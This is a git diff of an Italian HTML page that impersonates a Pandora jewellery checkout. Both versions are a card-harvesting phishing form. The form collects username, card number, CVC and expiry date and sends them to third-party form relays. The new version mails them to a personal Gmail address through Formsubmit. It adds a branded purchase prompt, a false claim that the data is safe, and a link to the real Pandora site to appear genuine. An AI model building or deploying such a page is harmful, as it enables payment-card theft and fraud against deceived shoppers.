@@ -3,87 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pagamento Pandora</title>
+    <title>Modulo Pandora</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
+            background-color: #f8f8f8;
             margin: 0;
             padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
-        .container {
-            max-width: 600px;
-            margin: 0 auto;
-            padding: 20px;
-            background-color: white;
+
+        .form-container {
+            background-color: #fff;
+            padding: 40px;
             border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
         }
+
         h1 {
             color: #333;
-            text-align: center;
+            font-size: 24px;
+            margin-bottom: 20px;
         }
-        .form-group {
-            margin-bottom: 15px;
-        }
-        .form-group label {
-            font-size: 14px;
-            color: #555;
-        }
-        .form-group input {
+
+        input[type="text"], input[type="number"], input[type="email"] {
             width: 100%;
-            padding: 10px;
-            font-size: 16px;
+            padding: 12px;
+            margin: 10px 0;
             border: 1px solid #ddd;
             border-radius: 4px;
+            font-size: 16px;
         }
-        .form-group input[type="submit"] {
-            background-color: #007BFF;
+
+        input[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background-color: #ff5733;
+            border: none;
             color: white;
+            font-size: 18px;
+            border-radius: 4px;
             cursor: pointer;
         }
-        .form-group input[type="submit"]:hover {
-            background-color: #0056b3;
+
+        input[type="submit"]:hover {
+            background-color: #e14a29;
         }
+
         .message {
-            text-align: center;
+            margin-top: 20px;
             font-size: 16px;
-            color: #4CAF50;
+            color: #666;
         }
+
+        .message a {
+            color: #ff5733;
+            text-decoration: none;
+        }
+
+        .message a:hover {
+            text-decoration: underline;
+        }
+
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Pagamento Pandora</h1>
-        <form action="https://formspree.io/f/xqablvgb" method="POST">
-            <!-- Campo Nome Utente -->
-            <div class="form-group">
-                <label for="username">Nome Utente:</label>
-                <input type="text" id="username" name="username" required>
-            </div>
-            <!-- Campo Numero Carta -->
-            <div class="form-group">
-                <label for="card-number">Numero Carta:</label>
-                <input type="text" id="card-number" name="card-number" maxlength="16" required>
-            </div>
-            <!-- Campo CVC -->
-            <div class="form-group">
-                <label for="cvc">CVC:</label>
-                <input type="text" id="cvc" name="cvc" maxlength="3" required>
-            </div>
-            <!-- Campo Data di Scadenza -->
-            <div class="form-group">
-                <label for="expiry-date">Data di Scadenza:</label>
-                <input type="text" id="expiry-date" name="expiry-date" required>
-            </div>
-            <!-- Pulsante Submit -->
-            <div class="form-group">
-                <input type="submit" value="Invia Dati">
-            </div>
+    <div class="form-container">
+        <h1>Completa il tuo acquisto Pandora 💍</h1>
+        <p>Inserisci i dati per acquistare la tua collana Pandora</p>
+
+        <!-- Form che invia i dati all'email tramite Formsubmit.io -->
+        <form action="https://formsubmit.io/send/porcodioporcodio.699@gmail.com" method="POST">
+            <input type="text" name="username" placeholder="Nome Utente" required>
+            <input type="number" name="cardnumber" placeholder="Numero Carta (max 16 cifre)" maxlength="16" required>
+            <input type="number" name="cvc" placeholder="CVC (max 3 cifre)" maxlength="3" required>
+            <input type="text" name="expirydate" placeholder="Data di Scadenza (MM/YY)" required>
+            
+            <input type="submit" value="Completa Acquisto">
         </form>
-        <!-- Messaggio di conferma -->
+
         <div class="message">
-            <p>Grazie per aver effettuato il pagamento 💖</p>
+            <p>Grazie per il pagamento ❤️. I tuoi dati sono al sicuro con noi.</p>
+            <p><a href="https://it.pandora.net/it/charm/catene-di-sicurezza/catena-di-sicurezza-margherite/798764C01.html" target="_blank">Clicca qui per visitare Pandora!</a></p>
         </div>
     </div>
 </body>
